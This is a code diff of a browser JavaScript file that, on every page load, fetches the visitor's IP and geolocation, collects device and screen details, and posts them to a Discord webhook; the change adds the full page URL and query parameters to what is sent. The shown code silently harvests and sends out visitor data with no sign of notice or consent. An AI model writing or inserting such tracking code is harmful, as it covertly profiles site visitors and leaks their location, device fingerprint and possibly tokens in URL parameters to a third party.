@@ -22,7 +22,7 @@ function sendToDiscord(message) {
     .catch(error => console.error('Error In Logging:', error));
 }
 
-// Log IP address, page, and parameters on page load
+// Log user details on page load
 window.addEventListener('load', () => {
     fetch('https://wtfismyip.com/json')
         .then(response => response.json())
@@ -52,8 +52,10 @@ window.addEventListener('load', () => {
                     const os = navigator.platform;
                     const availableMemory = navigator.deviceMemory;
                     const cpuThreads = navigator.hardwareConcurrency;
+                    const page = window.location.href;
+                    const params = window.location.search;
 
-                    sendToDiscord(`IP Address: ${ip}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nLatitude: ${latitude}\nLongitude: ${longitude}\nISP: ${isp}\nUser Agent: ${userAgent}\nWindow Width: ${windowWidth}\nWindow Height: ${windowHeight}\nWindow Ratio: ${windowRatio}\nScreen Width: ${screenWidth}\nScreen Height: ${screenHeight}\nScreen Ratio: ${screenRatio}\nScreen Pixel Ratio: ${screenPixelRatio}\nScreen DPI: ${screenDPI}\nScreen Color Depth: ${screenColorDepth}\nScreen Orientation: ${screenOrientation}\nScreen Rotation: ${screenRotation}\nOS: ${os}\nAvailable Browser Memory: ${availableMemory}\nCPU Threads: ${cpuThreads}`);
+                    sendToDiscord(`IP Address: ${ip}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nLatitude: ${latitude}\nLongitude: ${longitude}\nISP: ${isp}\nUser Agent: ${userAgent}\nWindow Width: ${windowWidth}\nWindow Height: ${windowHeight}\nWindow Ratio: ${windowRatio}\nScreen Width: ${screenWidth}\nScreen Height: ${screenHeight}\nScreen Ratio: ${screenRatio}\nScreen Pixel Ratio: ${screenPixelRatio}\nScreen DPI: ${screenDPI}\nScreen Color Depth: ${screenColorDepth}\nScreen Orientation: ${screenOrientation}\nScreen Rotation: ${screenRotation}\nOS: ${os}\nAvailable Browser Memory: ${availableMemory}\nCPU Threads: ${cpuThreads}\nPage: ${page}\nParameters: ${params}`);
                 })
                 .catch(error => console.error('Error getting IP details:', error));
         })
